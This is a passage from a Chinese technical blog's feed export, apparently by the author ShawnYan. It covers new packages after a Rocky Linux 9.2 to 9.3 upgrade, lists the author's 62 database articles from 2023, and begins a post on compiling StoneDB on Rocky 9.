<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ rpm -qa | grep gcc-toolset-13</span><br><span class="line">gcc-toolset-13-runtime-13.0-2.el9.x86_64</span><br><span class="line">gcc-toolset-13-libstdc++-devel-13.1.1-4.2.el9.x86_64</span><br><span class="line">gcc-toolset-13-annobin-docs-12.20-1.el9.noarch</span><br><span class="line">gcc-toolset-13-binutils-gold-2.40-13.el9.x86_64</span><br><span class="line">gcc-toolset-13-binutils-2.40-13.el9.x86_64</span><br><span class="line">gcc-toolset-13-gcc-13.1.1-4.2.el9.x86_64</span><br><span class="line">gcc-toolset-13-libquadmath-devel-13.1.1-4.2.el9.x86_64</span><br><span class="line">gcc-toolset-13-gcc-gfortran-13.1.1-4.2.el9.x86_64</span><br><span class="line">gcc-toolset-13-gcc-c++-13.1.1-4.2.el9.x86_64</span><br><span class="line">gcc-toolset-13-annobin-plugin-gcc-12.20-1.el9.x86_64</span><br><span class="line">gcc-toolset-13-gdb-12.1-3.el9.x86_64</span><br><span class="line">gcc-toolset-13-dwz-0.14-0.el9.x86_64</span><br><span class="line">gcc-toolset-13-13.0-2.el9.x86_64</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<ul>
<li>运行会话，查看 gcc 版本</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ scl <span class="built_in">enable</span> gcc-toolset-13 bash</span><br><span class="line">[shawnyan@rocky9 ~]$ gcc --version</span><br><span class="line">gcc (GCC) 13.1.1 20230614 (Red Hat 13.1.1-4)</span><br><span class="line">Copyright (C) 2023 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the <span class="built_in">source</span> <span class="keyword">for</span> copying conditions.  There is NO</span><br><span class="line">warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line"></span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<!--
The GNU Compiler Collection (GCC) provides tools for developing applications with the C, C++, and Fortran programming languages.

Bugzilla:2193180
https://bugzilla.redhat.com/show_bug.cgi?id=2193180

To run a tool from GCC Toolset 13:
$ scl enable gcc-toolset-13 tool
To run a shell session where tool versions from GCC Toolset 13 override system versions of these tools:
-->
<h3 id="Java-运行环境">Java 运行环境</h3>
<p>在 Rocky 9.2 中，appstream 仓库中包含 OpenJDK 1.8.0/11/17 三个版本。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.2 (Blue Onyx)</span><br><span class="line">[shawnyan@rocky9 ~]$ yum list java-*-openjdk</span><br><span class="line">Last metadata expiration check: 4 days, 18:16:06 ago on Sat 11 Nov 2023 08:35:35 PM UTC.</span><br><span class="line">Available Packages</span><br><span class="line">java-1.8.0-openjdk.x86_64       1:1.8.0.392.b08-3.el9               appstream</span><br><span class="line">java-11-openjdk.x86_64          1:11.0.21.0.9-2.el9                 appstream</span><br><span class="line">java-17-openjdk.x86_64          1:17.0.9.0.9-2.el9                  appstream</span><br></pre></td></tr></table></figure></div>
<p>而在 Rocky 9.3 中，appstream 仓库新增包含了 OpenJDK 21。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.3 (Blue Onyx)</span><br><span class="line">[shawnyan@rocky9 ~]$ yum list java-*-openjdk</span><br><span class="line">Rocky Linux 9 - AppStream                                                                5.4 MB/s | 7.4 MB     00:01</span><br><span class="line">Rocky Linux 9 - BaseOS                                                                   2.5 MB/s | 2.2 MB     00:00</span><br><span class="line">Rocky Linux 9 - Extras                                                                    30 kB/s |  13 kB     00:00</span><br><span class="line">Available Packages</span><br><span class="line">java-1.8.0-openjdk.x86_64                              1:1.8.0.392.b08-3.el9                                  appstream</span><br><span class="line">java-11-openjdk.x86_64                                 1:11.0.21.0.9-2.el9                                    appstream</span><br><span class="line">java-17-openjdk.x86_64                                 1:17.0.9.0.9-2.el9                                     appstream</span><br><span class="line">java-21-openjdk.x86_64                                 1:21.0.1.0.12-3.el9                                    appstream</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<h3 id="DBMS-数据库">DBMS 数据库</h3>
<p>在 Rocky 9.2 中，默认提供四种数据库： MariaDB 10.5, MySQL 8.0, PostgreSQL 13/15, Redis 6。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.2 (Blue Onyx)</span><br><span class="line">[shawnyan@rocky9 ~]$ yum list mariadb-server*</span><br><span class="line">Last metadata expiration check: 5 days, 12:24:51 ago on Sat 11 Nov 2023 08:35:35 PM UTC.</span><br><span class="line">Available Packages</span><br><span class="line">mariadb-server.x86_64                                        3:10.5.22-1.el9_2                                  appstream</span><br><span class="line">mariadb-server-galera.x86_64                                 3:10.5.22-1.el9_2                                  appstream</span><br><span class="line">mariadb-server-utils.x86_64                                  3:10.5.22-1.el9_2                                  appstream</span><br><span class="line">[shawnyan@rocky9 ~]$ yum list mysql-server*</span><br><span class="line">Last metadata expiration check: 5 days, 12:24:53 ago on Sat 11 Nov 2023 08:35:35 PM UTC.</span><br><span class="line">Available Packages</span><br><span class="line">mysql-server.x86_64                                       8.0.32-1.el9_2                                        appstream</span><br><span class="line">[shawnyan@rocky9 ~]$ yum list postgresql-server*</span><br><span class="line">Last metadata expiration check: 5 days, 12:24:58 ago on Sat 11 Nov 2023 08:35:35 PM UTC.</span><br><span class="line">Available Packages</span><br><span class="line">postgresql-server.x86_64                                        13.11-1.el9_2                                   appstream</span><br><span class="line">[shawnyan@rocky9 ~]$ dnf list redis</span><br><span class="line">Last metadata expiration check: 5 days, 13:58:28 ago on Sat 11 Nov 2023 08:35:35 PM UTC.</span><br><span class="line">Available Packages</span><br><span class="line">redis.x86_64                                            6.2.7-1.el9                                             appstream</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<p>升级到 Rocky 9.3 之后，由于时间关系，这四种准预装的数据库版本尚未更新。这里暂且留个 TODO，我们之后再看。</p>
<p>此外，从 RHEL 9.2 开始，引入了 <code>postgresql:15</code> 模块流，可以通过以下方式进行安装 PG15.</p>
<!--
https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/configuring_and_using_database_servers/using-postgresql_configuring-and-using-database-servers
Additional PostgreSQL versions are provided as modules with a shorter life cycle in minor releases of RHEL 9. RHEL 9.2 introduced PostgreSQL 15 as the postgresql:15 module stream. 
-->
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo dnf module install postgresql:15/server</span><br><span class="line">Last metadata expiration check: 2:39:51 ago on Fri 17 Nov 2023 07:07:33 AM UTC.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">=========================================================================================================================</span><br><span class="line"> Package                          Architecture    Version                                       Repository          Size</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Installing group/module packages:</span><br><span class="line"> postgresql-server                x86_64          15.3-1.module+el9.2.0+14925+a515b28a          appstream          6.1 M</span><br><span class="line">Installing dependencies:</span><br><span class="line"> postgresql                       x86_64          15.3-1.module+el9.2.0+14925+a515b28a          appstream          1.6 M</span><br><span class="line"> postgresql-private-libs          x86_64          15.3-1.module+el9.2.0+14925+a515b28a          appstream          137 k</span><br><span class="line">Installing module profiles:</span><br><span class="line"> postgresql/server</span><br><span class="line">Enabling module streams:</span><br><span class="line"> postgresql                                       15</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Install  3 Packages</span><br><span class="line"></span><br><span class="line">Total download size: 7.8 M</span><br><span class="line">Installed size: 32 M</span><br></pre></td></tr></table></figure></div>
<h3 id="iproute">iproute</h3>
<p>iproute 是高级IP路由和网络设备配置工具，包括常用的网络，如 ip, ss, tc 等。</p>
<!--
https://wiki.linuxfoundation.org/networking/iproute2
-->
<p>在 Rocky 9.2 中，iproute 的版本为 6.1.0。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.2 (Blue Onyx)</span><br><span class="line">[shawnyan@rocky9 ~]$ rpm -qa | grep iproute</span><br><span class="line">iproute-6.1.0-1.el9.x86_64</span><br><span class="line">iproute-tc-6.1.0-1.el9.x86_64</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<p>升级到 Rocky 9.3 后，iproute 的版本为 6.2.0。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.3 (Blue Onyx)</span><br><span class="line">[shawnyan@rocky9 ~]$ rpm -qa | grep iproute</span><br><span class="line">iproute-6.2.0-5.el9.x86_64</span><br><span class="line">iproute-tc-6.2.0-5.el9.x86_64</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<p>这里介绍一个新命令，<code>ip stats</code>，可以管理、显示接口状态信息，默认显示所有网络设备，包括 bridges 和 bonds，也可以通过 <code>dev</code> 和 <code>group</code> 过滤信息。</p>
<p>例如：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ ip stats show dev ens33</span><br><span class="line">2: ens33: group offload subgroup hw_stats_info</span><br><span class="line">    l3_stats off used off</span><br><span class="line">2: ens33: group xstats_slave subgroup bond suite 802.3ad</span><br><span class="line">2: ens33: group xstats_slave subgroup bridge suite mcast</span><br><span class="line">2: ens33: group xstats_slave subgroup bridge suite stp</span><br><span class="line">2: ens33: group xstats subgroup bond suite 802.3ad</span><br><span class="line">2: ens33: group xstats subgroup bridge suite mcast</span><br><span class="line">2: ens33: group xstats subgroup bridge suite stp</span><br><span class="line">2: ens33: group afstats subgroup mpls</span><br><span class="line">2: ens33: group offload subgroup l3_stats off used off</span><br><span class="line">2: ens33: group offload subgroup cpu_hit</span><br><span class="line"></span><br><span class="line">2: ens33: group link</span><br><span class="line">    RX:  bytes packets errors dropped  missed   mcast</span><br><span class="line">     137826417   94630      0       0       0       0</span><br><span class="line">    TX:  bytes packets errors dropped carrier collsns</span><br><span class="line">       2292768   36535      0       0       0       0</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<!--
iproute rebased to version 6.2.0

The iproute packages have been upgraded to upstream version 6.2.0, which provides a number of enhancements and bug fixes over the previous version. The most notable changes are:

    The new ip stats command manages and shows interface statistics. By default, the ip stats show command displays statistics for all network devices, including bridges and bonds. You can filter the output by using the dev and group options. For further details, see the ip-stats(8) man page.
    The ss utility now provides the -T (--threads) option to display thread information, which extends the -p (--processes) option. For further details, see the ss(8) man page.
    You can use the new bridge fdb flush command to remove specific forwarding database (fdb) entries which match a supplied option. For further details, see the bridge(8) man page. 

Jira:RHEL-428[1] 
-->
<h2 id="总结">总结</h2>
<p>本文演示了如何将 Rocky Linux 9.2 升级到 9.3，并着重介绍了几点值得一看的新特性。</p>
<p>Rocky Linux 9.3 是 23 年发行的第二个大版本，相信已经有企业将 Rocky 9 用于生产环境。</p>
<p>关于 Rocky 9 的更多分享，还将继续。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1726849694440185856" >https://www.modb.pro/db/1726849694440185856 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Red Hat</category>
        <category>Rocky</category>
      </categories>
      <tags>
        <tag>redhat</tag>
        <tag>centos</tag>
        <tag>rocky</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【合集】2023 年文章清单</title>
    <url>/2023/other/my-articles-2023/</url>
    <content><![CDATA[<p>整理 2023 年的文章清单如下，合计 62 篇。<br>
（按文章发布时间排序）</p>
<h2 id="MySQL">MySQL</h2>
<ol>
<li>2023-07-18, <a href="https://shawnyan.cn/2023/mysql/mysql-8.1.0-release/">重磅！MySQL 8.1.0 已来！有彩蛋~</a></li>
<li>2023-07-25, <a href="https://shawnyan.cn/2023/mysql/mysql-8.0.26-bug-crash/">再遇 MySQL “一招必杀” Bug</a></li>
<li>2023-10-27, <a href="https://shawnyan.cn/2023/mysql/mysql-8.2.0-sys-vars/">【MySQL 8.2.0】从参数变化解读 MySQL 8.2.0 发版说明</a></li>
<li>2023-10-31, <a href="https://shawnyan.cn/2023/mysql/mysql-8.2.0-compile-on-rocky-9/">【MySQL 8.2.0】在 Rocky 9 上编译 MySQL 8.2.0 Debug 版本编译指南</a></li>
<li>2023-11-08, <a href="https://shawnyan.cn/2023/mysql/mysql-8.2.0-compile-customization/">【MySQL 8.2.0】定制化 MySQL 8.2.0 编译选项（文末彩蛋）</a></li>
</ol>
<h2 id="TiDB">TiDB</h2>
<ol>
<li>2023-02-23, <a href="https://shawnyan.cn/2023/tidb/tidb-aliyun-trial/">TiDB x Aliyun 免费试用，竟还有这般福利？</a></li>
<li>2023-07-05, <a href="https://shawnyan.cn/2023/tidb/tidb-7.1-resource-control/">TiDB 7.1.0 LTS 特性解读 | 资源管控 (Resource Control) 应该知道的 6 件事</a></li>
<li>2023-07-24, <a href="https://shawnyan.cn/2023/tidb/tidb-7.1-tispark-3.x/">TiDB 7.1.0 LTS 特性解读 | 浅析 TiSpark v3.x 新变化</a></li>
<li>2023-07-31, <a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-pd/">TiDB 7.x 源码编译之 PD/TiDB Dashboard 篇</a></li>
<li>2023-08-07, <a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-tiup/">TiDB 7.x 源码编译之 TiUP 篇，及新特性解析</a></li>
<li>2023-08-15, <a href="https://shawnyan.cn/2023/tidb/my-story-with-tidb-2023/">我和 TiDB 的故事 | 远近高低各不同</a></li>
<li>2023-08-15, <a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-tiflash/">TiDB 7.x 源码编译之 TiFlash 篇</a></li>
<li>2023-08-23, <a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-tiproxy/">TiDB 7.x 源码编译之 TiProxy 篇，及尝鲜体验</a></li>
<li>2023-10-17, <a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-tidb/">TiDB 7.x 源码编译之 TiDB Server 篇，及新特性详解（文末彩蛋）</a></li>
<li>2023-11-20, <a href="https://shawnyan.cn/2023/tidb/tidb-talk-record-rakuten/">记 Rakuten 技术分享会</a></li>
<li>2023-12-07, <a href="https://shawnyan.cn/2023/tidb/tidb-7.5-new-feature/">TiDB v7.5.0 LTS 升级必读 | 新特性补充说明</a></li>
</ol>
<h2 id="MariaDB">MariaDB</h2>
<ol>
<li>2023-06-09, <a href="https://shawnyan.cn/2023/mysql/mariadb-v10.11-new-feature/">MariaDB v10.11 新特性速览</a></li>
<li>2023-11-21, <a href="https://shawnyan.cn/2023/mysql/mariadb-v10.6.16-upgrade/">再遇“含笑半步颠”，升级 MariaDB 10.6.16 的三个理由</a></li>
</ol>
<h2 id="ProxySQL">ProxySQL</h2>
<ol>
<li>2023-06-13, <a href="https://shawnyan.cn/2023/mysql/proxysql-v2.4.7-new-feature/">ProxySQL v2.4.7 安装及新特性速览</a></li>
<li>2023-06-19, <a href="https://shawnyan.cn/2023/mysql/proxysql-v2.5.2-new-feature/">ProxySQL v2.5.2 版本升级及新特性速览</a></li>
</ol>
<h2 id="PostgreSQL">PostgreSQL</h2>
<ol>
<li>2023-03-01, <a href="https://shawnyan.cn/2023/postgresql/pg-15-ext-jieba/">【PG15】PostgreSQL 中文分词插件 pg_jieba 编译安装</a></li>
<li>2023-03-02, <a href="https://shawnyan.cn/2023/postgresql/pg-15-psqlrc/">【PG15】有趣的 psqlrc 你真的学废了麽</a></li>
<li>2023-03-03, <a href="https://shawnyan.cn/2023/postgresql/pg-15-check-txid-with-python/">【PG15】Python 脚本定时查询当前 txid</a></li>
<li>2023-03-06, <a href="https://shawnyan.cn/2023/postgresql/pg-15-progress-memory/">【PG15】如何查看 PostgreSQL 进程占用内存情况</a></li>
<li>2023-03-08, <a href="https://shawnyan.cn/2023/postgresql/pg-15-jsonlog/">【PG15】PostgreSQL 15 新日志格式 jsonlog</a></li>
<li>2023-03-15, <a href="https://shawnyan.cn/2023/postgresql/pg-15-pg-basebackup-new-feature/">【PG15】pg_basebackup 在 PostgreSQL 15 中的新特性</a></li>
<li>2023-03-19, <a href="https://shawnyan.cn/2023/postgresql/pg-15-compile-with-dockerfile/">【PG15】【番外篇】自定义 Dockerfile 构建 PostgreSQL 15 编译版 Docker 镜像</a></li>
<li>2023-11-22, <a href="https://shawnyan.cn/2023/postgresql/pg-15-install-on-rocky-9/">【PG15】 在 Rocky 9 上安装 PostgreSQL 15 的五种方法（总有一个你没用过🤪）</a></li>
<li>2023-03-31, <a href="https://shawnyan.cn/2023/postgresql/pg-catalog/">PG 中的 Catalog</a></li>
<li>2023-09-29, <a href="https://shawnyan.cn/2023/postgresql/pg-16-run-on-centos-7/">【PG16】后 RHEL 7 时代, PG 16 如何在 CentOS 7 上运行</a></li>
<li>2023-07-27, <a href="https://shawnyan.cn/2023/postgresql/ivorysql-v2.3-feature/">象牙数据库 IvorySQL v2.3 特性浅析</a></li>
<li>2023-10-31, <a href="https://shawnyan.cn/2023/postgresql/ivorysql-v3.0-feature/">IvorySQL v3.0 新特性浅测</a></li>
</ol>
<h2 id="GBase">GBase</h2>
<ol>
<li>2023-03-14, <a href="https://shawnyan.cn/2023/gbase/gbase-8c-install/">快速搭建 GBase 8c 集群环境</a></li>
<li>2023-03-19, <a href="https://shawnyan.cn/2023/gbase/gbase-8c-cmd-problem/">GBase 8c 分布式数据库 常用命令 &amp; 常见问题 集锦</a></li>
<li>2023-03-30, <a href="https://shawnyan.cn/2023/gbase/gbase-8c-extensions/">GBase 8c 预装的扩展插件有哪些？</a></li>
<li>2023-04-09, <a href="https://shawnyan.cn/2023/gbase/gbase-8c-my-story/">再遇 GBase 如沐春风</a></li>
</ol>
<h2 id="StoneDB">StoneDB</h2>
<ol>
<li>2023-07-05, <a href="https://shawnyan.cn/2023/stonedb/stonedb-install/">StoneDB 初体验 | StoneDB-5.7-v1.0.4 安装及新特性速览</a></li>
<li>2023-11-12, <a href="https://shawnyan.cn/2023/stonedb/stonedb-compile-on-rocky-9/">三天三夜的三更半夜! StoneDB on Rocky 9</a></li>
<li>2023-12-06, <a href="https://shawnyan.cn/2023/stonedb/stonedb-8.0-v2.2.0-ee/">StoneDB 企业版 8.0-v2.2.0 初体验</a></li>
</ol>
<h2 id="openGauss">openGauss</h2>
<ol>
<li>2023-07-07, <a href="https://shawnyan.cn/2023/opengauss/opengauss-v5-mysql-grammar/">浅尝 openGauss v5.0.0 的 MySQL 语法兼容性</a></li>
<li>2023-07-11, <a href="https://shawnyan.cn/2023/opengauss/opengauss-v5-partition-table/">openGauss 5.0.0 分区表增强</a></li>
<li>2023-07-11, <a href="https://shawnyan.cn/2023/opengauss/opengauss-v5-transaction-grammar/">openGauss 5.0.0 事务相关语法</a></li>
<li>2023-07-12, <a href="https://shawnyan.cn/2023/opengauss/opengauss-v5-resource-load-mgmt/">openGauss 5.0.0 资源管控功能介绍</a></li>
</ol>
<h2 id="Rocky-Linux">Rocky Linux</h2>
<ol>
<li>2023-10-24, <a href="https://shawnyan.cn/2023/linux/rocky-9.2-install/">【Rocky 9】Step by Step 安装 Rocky Linux 9.2 系统</a></li>
<li>2023-10-25, <a href="https://shawnyan.cn/2023/linux/centos-7.9-upgrade-to-rocky-9.2/">【Rocky 9】Step by Step 从 CentOS 7.9 升级到 Rocky Linux 9.2</a></li>
<li>2023-11-21, <a href="https://shawnyan.cn/2023/linux/rocky-9.3-upgrade-from-9.2/">【Rocky9】Rocky Linux 9.2 升级 9.3，及新特性实践</a></li>
</ol>
<h2 id="YashanDB">YashanDB</h2>
<ol>
<li>2023-10-31, <a href="https://shawnyan.cn/2023/yashan/yashandb-install/">「YashanDB个人版体验」YashanDB 个人版安装初体验</a></li>
<li>2023-11-24, <a href="https://shawnyan.cn/2023/yashan/yashandb-dockerfile/">「YashanDB个人版体验」定制 Dockerfile 构建 YashanDB 个人版镜像，并基于此搭建主备高可用</a></li>
<li>2023-11-28, <a href="https://shawnyan.cn/2023/yashan/yashandb-haproxy/">「YashanDB个人版体验」基于 HAProxy 配置 YashanDB 的读写分离</a></li>
<li>2023-11-29, <a href="https://shawnyan.cn/2023/yashan/yashandb-odbc/">「YashanDB个人版体验」通过 ODBC 连接 YashanDB 和 MariaDB</a></li>
<li>2023-12-03, <a href="https://shawnyan.cn/2023/yashan/yashandb-benchmarksql/">「YashanDB个人版体验」YashanDB 23 与 BenchmarkSQL 6 兼容性适配</a></li>
</ol>
<h2 id="Others">Others</h2>
<ol>
<li>2023-01-15, <a href="https://shawnyan.cn/2023/other/oushudb-odcp/">OushuDB – ODCP 课程学习笔记</a></li>
<li>2023-06-12, <a href="https://shawnyan.cn/2023/other/galaxybase-gbca/">GBCA (Galaxybase) 认证学习资料内参</a></li>
<li>2023-06-25, <a href="https://shawnyan.cn/2023/other/goldendb-intro/">GoldenDB 简介</a></li>
<li>2023-07-21, <a href="https://shawnyan.cn/2023/other/database-book-list/">严选书单 | 国产数据库的技术书籍（最新版）</a></li>
<li>2023-08-09, <a href="https://shawnyan.cn/2023/other/minio-intro/">浅尝 MinIO 存储</a></li>
<li>2023-06-08, <a href="https://shawnyan.cn/2023/modb/modb-bytebase-intro/">王长煜：Bytebase ——开发者友好的变更管理平台</a></li>
<li>2023-06-15, <a href="https://shawnyan.cn/2023/modb/modb-aliyun-sql-challenge/">交卷！阿里云瑶池数据库SQL挑战赛！</a></li>
<li>2023-08-07, <a href="https://shawnyan.cn/2023/modb/modb-how-to-be-a-good-dba/">如何成为一名国产数据库 DBA ?</a></li>
<li>2023-09-13, <a href="https://shawnyan.cn/2023/modb/modb-articles-recommended/">【年终盘点】【合集】严选首推文章清单</a></li>
<li>2023-12-11, <a href="https://shawnyan.cn/2023/other/antdb-install/">AntDB v7.2.0 社区版适配 Rocky 9 及体验笔记</a></li>
<li>2023-12-11, <a href="https://shawnyan.cn/2023/other/my-db-cert-2023/">【2023年终盘点】那些今年考下的国产数据库认证</a></li>
</ol>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>清单</category>
      </categories>
      <tags>
        <tag>gbase</tag>
        <tag>centos</tag>
        <tag>mariadb</tag>
        <tag>mysql</tag>
        <tag>postgresql</tag>
        <tag>tidb</tag>
        <tag>rocky</tag>
      </tags>
  </entry>
  <entry>
    <title>三天三夜的三更半夜! StoneDB on Rocky 9</title>
    <url>/2023/stonedb/stonedb-compile-on-rocky-9/</url>
    <content><![CDATA[<!--
![stonedb-logo.png](https://oss-emcsprod-public.modb.pro/image/knowledge/dbentry_1653961012338.png)
-->
<img  alt="stonedb-logo.gif" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231112-eb248ffd-a26e-4961-a300-1ad96d40c363.gif"
                      referrerpolicy="no-referrer"
                >
<h2 id="TL-DR">TL;DR</h2>
<p>之前体验过如何安装 StoneDB，并发文演示了几个新特性。关于什么是 StoneDB，请先参阅前文。</p>
<ul>
<li><a href="https://shawnyan.cn/2023/stonedb/stonedb-install/">StoneDB 初体验 | StoneDB-5.7-v1.0.4 安装及新特性速览</a></li>
</ul>
<!--
- [StoneDB 初体验 | StoneDB-5.7-v1.0.4 安装及新特性速览](https://www.modb.pro/db/655984)
-->
<p>本文记录了这几天在 Rocky Linux 9.2 上编译安装 StoneDB 5.7 最新源码的“扎心”经历。<br>
对 StoneDB、MySQL、RocksDB 或 Rocky 9 感兴趣的同学请继续往下阅读。</p>
<h2 id="环境信息">环境信息</h2>
<p>操作系统为 Rocky Linux 9.2，编译过程中没有出现特别消耗资源的情况，这点不错，我的 VM 是 2c4g，可以编译成功。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.2 (Blue Onyx)</span><br><span class="line">[shawnyan@rocky9 ~]$ uname -a</span><br><span class="line">Linux rocky9.shawnyan.cn 5.14.0-284.30.1.el9_2.x86_64 #1 SMP PREEMPT_DYNAMIC Sat Sep 16 09:55:41 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br><span class="line">[shawnyan@rocky9 ~]$ gcc --version</span><br><span class="line">gcc (GCC) 11.3.1 20221121 (Red Hat 11.3.1-4)</span><br><span class="line">Copyright (C) 2021 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line"></span><br><span class="line">[shawnyan@rocky9 ~]$ cmake --version</span><br><span class="line">cmake version 3.20.2</span><br><span class="line"></span><br><span class="line">CMake suite maintained and supported by Kitware (kitware.com/cmake).</span><br><span class="line">[shawnyan@rocky9 ~]$ top</span><br><span class="line">top - 15:28:57 up 12 days,  1:23,  2 users,  load average: 0.01, 0.03, 0.00</span><br><span class="line">Tasks: 272 total,   1 running, 271 sleeping,   0 stopped,   0 zombie</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">Cpu0  :  0.0 us,  0.3 sy,  0.0 ni, 99.0 <span class="built_in">id</span>,  0.0 wa,  0.3 hi,  0.3 si,  0.0 st</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">Cpu1  :  0.0 us,  0.3 sy,  0.0 ni, 99.7 <span class="built_in">id</span>,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span></span><br><span class="line">MiB Mem :   3623.0 total,    818.1 free,    947.4 used,   2131.4 buff/cache</span><br><span class="line">MiB Swap:   4020.0 total,   3158.1 free,    861.9 used.   2675.6 avail Mem</span><br></pre></td></tr></table></figure></div>
<h2 id="查看-StoneDB-的安装路径和版本号">查看 StoneDB 的安装路径和版本号</h2>
<p>先上成果物，看看编译安装后的 StoneDB 目录下都有哪些文件。</p>
<img  alt="img1-mysqld-version.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231112-2c68f249-0e36-475e-b347-eb27dce795b5.png"
                      referrerpolicy="no-referrer"
                >
<p>安装路径是默认值，安装在了 <code>/usr/local/mysql</code> 目录下，查看版本号为 <code>StoneDB-5.7.36</code>。</p>
<p>本地环境的 ntpd 没有同步，所以编译时间有点错乱，快了 8 小时。</p>
<h2 id="创建-Tianmu-测试表">创建 Tianmu 测试表</h2>
<p>StoneDB 启动后，通过客户端进行连接，<code>\s</code> 查看状态，服务器版本看着有点“凌乱”，不用在意这种细节。</p>
<img  alt="img2-mysql-version.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231112-5577cbe9-418d-40c3-858d-5545ffb334cf.png"
                      referrerpolicy="no-referrer"
                >
<p>查看默认数据库，与前文描述一致。创建一个测试库，并创建引擎为 <code>TIANMU</code> 的测试表，功能使用正常。</p>
<img  alt="img3-tianmu-table.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231112-b70b660b-1188-40ac-a2f2-47f033653f25.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="编译配置">编译配置</h2>
<p>相对于前文的丝滑安装，这里的编译过程极其痛苦，犹如工兵步步排雷，好在最终扛到军旗。</p>
<h3 id="源码仓库">源码仓库</h3>
<p>StoneDB 提供了 GitHub 和 Gitee 两个代码仓，只是并不同步，如果网路条件允许，还是从 GH 下载比较好。</p>
<ul>
<li><a class="link"   href="https://github.com/stoneatom/stonedb" >https://github.com/stoneatom/stonedb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://gitee.com/StoneDB/stonedb" >https://gitee.com/StoneDB/stonedb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="官网地址解析">官网地址解析</h3>
<p>官网只能识别 https，无法识别 http，好在vx群里有好人帮忙确认官网状态正常，感谢。</p>
<img  alt="img4-http-ngx.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231112-30d736e0-b2bb-4a79-8b00-9d3f084456a2.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="Rocksdb-下载链接">Rocksdb 下载链接</h3>
<p>Tianmu 引擎依赖 Rocksdb，如果配置时没有指定包，则会自动下载，只是下载的版本有些“老舅”，且“门牌号”不对。</p>
<img  alt="img5-git-rocksdb.png" 
                     lazyload
